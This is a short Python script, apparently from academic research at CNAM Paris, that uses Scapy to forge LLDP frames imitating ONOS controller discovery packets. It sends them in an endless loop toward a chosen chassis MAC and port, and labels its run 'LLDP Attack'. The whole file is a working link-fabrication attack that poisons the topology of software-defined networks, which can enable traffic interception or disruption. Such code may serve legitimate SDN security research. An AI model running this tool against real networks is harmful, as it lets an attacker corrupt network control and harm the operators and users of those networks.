#!/usr/bin/python3
# Flavien JOLY POTTUZ / CNAM PARIS
# All rights reserved
# April 2020

from scapy.contrib.lldp import *
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp
import argparse
import time


def start_lldp_forge():
    # Forge packet
    pkt = Ether(src=args.eth_mac_src,
                dst=args.eth_mac_dst) / \
          LLDPDUChassisID(subtype=LLDPDUChassisID.SUBTYPE_MAC_ADDRESS,
                          id=args.chassis_mac) / \
          LLDPDUPortID(subtype=LLDPDUPortID.SUBTYPE_PORT_COMPONENT,
                       id=bytes(args.source_port, 'utf-8')) / \
          LLDPDUTimeToLive(ttl=120) / \
          LLDPDUGenericOrganisationSpecific(subtype=1,
                                            org_code=0xA42305,
                                            data="ONOS Discovery") / \
          LLDPDUGenericOrganisationSpecific(subtype=2,
                                            org_code=0xA42305,
                                            data=f"of:0000{args.chassis_mac.replace(':','')}") / \
          LLDPDUEndOfLLDPDU()

    # Send the handcrafted packet forever
    while True:
        sendp(pkt)
        time.sleep(args.delta)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--delta", help="Time between two LLDP packet",
                        type=int, required=True)
    parser.add_argument("--eth-mac-src", help="Source MAC Address of LLDP packet (fingerprint)",
                        type=str, required=True)
    parser.add_argument("--eth-mac-dst", help="Destination MAC Address of LLDP packet (LLDP or BDDP)",
                        type=str, default="a5:23:05:00:00:01")
    parser.add_argument("--chassis-mac", help="Target Chassis MA@ | format XX:XX:XX:XX:XX:XX",
                        type=str, required=True)
    parser.add_argument("--source-port", help="Target port ID",
                        type=str, required=True)
    args = parser.parse_args()

    try:
        print("Start LLDP Attack...")
        start_lldp_forge()
    except KeyboardInterrupt:
        print("\nStop LLDP Attack...")
